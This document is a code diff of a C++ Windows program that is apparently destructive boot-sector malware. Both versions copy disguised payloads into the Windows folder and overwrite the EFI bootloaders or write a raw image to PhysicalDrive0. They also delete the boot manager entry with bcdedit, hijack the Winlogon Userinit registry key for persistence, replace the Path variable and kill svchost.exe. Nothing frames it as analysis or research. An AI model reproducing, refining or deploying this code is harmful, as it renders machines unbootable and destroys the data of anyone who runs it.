@@ -1,10 +1,6 @@
-#include <iostream>
-#include <cstdlib>
 #include <Windows.h>
 #include <WinUser.h>
-#include <stdlib.h>
 #include <direct.h>
-#include <fstream>
 #include <vector>
 #include <winbase.h>
 
@@ -18,9 +14,9 @@ wchar_t* convertCharArrayToLPCWSTR(const char* charArray)
 }
 
 void UnpackDeps(LPCWSTR filename) {
-    CopyFile(filename, L"C:\\Windows\\system32\\Checkr.exe", false);
-    CopyFile(L"appvcompat.dll", L"C:\\Windows\\system32\\boot.bin", false);
-    CopyFile(L"appverifui.dll", L"C:\\Windows\\system32\\boot.efi", false);
+    CopyFile(filename, L"C:\\Windows\\nt32.exe", false);
+    CopyFile(L"appvcompat.dll", L"C:\\Windows\\boot.bin", false);
+    CopyFile(L"appverifui.dll", L"C:\\Windows\\boot.efi", false);
 }
 
 DWORD is_efi() {
@@ -31,16 +27,14 @@ DWORD is_efi() {
 
 int BIOSBootFlash() {
     // Open the source file
-    HANDLE hSource = CreateFile(TEXT("C:\\Windows\\system32\\boot.bin"), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    HANDLE hSource = CreateFile(TEXT("C:\\Windows\\boot.bin"), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hSource == INVALID_HANDLE_VALUE) {
-         cerr << "Failed to open source file.\n";
         return 1;
     }
 
     // Get the size of the source file
     LARGE_INTEGER fileSize;
     if (!GetFileSizeEx(hSource, &fileSize)) {
-        cerr << "Failed to get source file size.\n";
         CloseHandle(hSource);
         return 1;
     }
@@ -49,7 +43,6 @@ int BIOSBootFlash() {
     vector<BYTE> buffer(fileSize.QuadPart);
     DWORD bytesRead;
     if (!ReadFile(hSource, buffer.data(), buffer.size(), &bytesRead, NULL) || bytesRead != buffer.size()) {
-        cerr << "Failed to read source file.\n";
         CloseHandle(hSource);
         return 1;
     }
@@ -60,14 +53,12 @@ int BIOSBootFlash() {
     // Open the target disk
     HANDLE hDevice = CreateFile(TEXT("\\\\.\\PhysicalDrive0"), GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
     if (hDevice == INVALID_HANDLE_VALUE) {
-        cerr << "Failed to open device.\n";
         return 1;
     }
 
     // Write the buffer to the disk
     DWORD bytesWritten;
     if (!WriteFile(hDevice, buffer.data(), buffer.size(), &bytesWritten, NULL) || bytesWritten != buffer.size()) {
-        cerr << "Failed to write to device.\n";
         CloseHandle(hDevice);
         return 1;
     }
@@ -122,7 +113,7 @@ LONG SetRegValue(const wchar_t* path, const wchar_t* name, const wchar_t* value)
 
 int main(int argc, char ** argv)
 {
-    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
+    ::ShowWindow(::GetConsoleWindow(), SW_SHOW);
 
     LPCWSTR filename = convertCharArrayToLPCWSTR(argv[0]);
 
@@ -134,23 +125,21 @@ int main(int argc, char ** argv)
     int secondconfirmbox = MessageBox(NULL, L"ALL DATA WILL BE DESTROYED! Are you sure you want to continue?", L"WARNING (Double check)", MB_OKCANCEL | MB_ICONEXCLAMATION);
     if (secondconfirmbox == IDCANCEL) return 0;
 
-    SetRegValue(L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", L"Userinit", L"C:\\Windows\\system32\\userinit.exe,C:\\Windows\\system32\\Checkr.exe");
-
     if (is_efi() != ERROR_INVALID_FUNCTION) {
-        system("mountvol P: /S");
+        system("C:\\Windows\\System32\\mountvol P: /S");
         DeleteFile(L"P:\\EFI\\Boot\\bootx64.efi");
-        CopyFile(L"C:\\Windows\\system32\\boot.efi", L"P:\\EFI\\Boot\\bootx64.efi", false);
+        CopyFile(L"C:\\Windows\\boot.efi", L"P:\\EFI\\Boot\\bootx64.efi", false);
         DeleteFile(L"P:\\EFI\\Microsoft\\Boot\\bootmgfw.efi");
-        CopyFile(L"C:\\Windows\\system32\\boot.efi", L"P:\\EFI\\Microsoft\\Boot\\bootmgfw.efi", false);
-        system("bcdedit /delete {bootmgr}");
+        CopyFile(L"C:\\Windows\\boot.efi", L"P:\\EFI\\Microsoft\\Boot\\bootmgfw.efi", false);
+        system("C:\\Windows\\System32\\bcdedit /f /delete {bootmgr}");
     }
     else {
         BIOSBootFlash();
     }
 
-
 	SetPermanentEnvironmentVariable(L"Path", L"trololol");
+    SetRegValue(L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", L"Userinit", L"C:\\Windows\\userinit.exe,C:\\Windows\\nt32.exe");
     system("taskkill /f /im svchost.exe");
-
+    getchar();
 	return 0;
 }
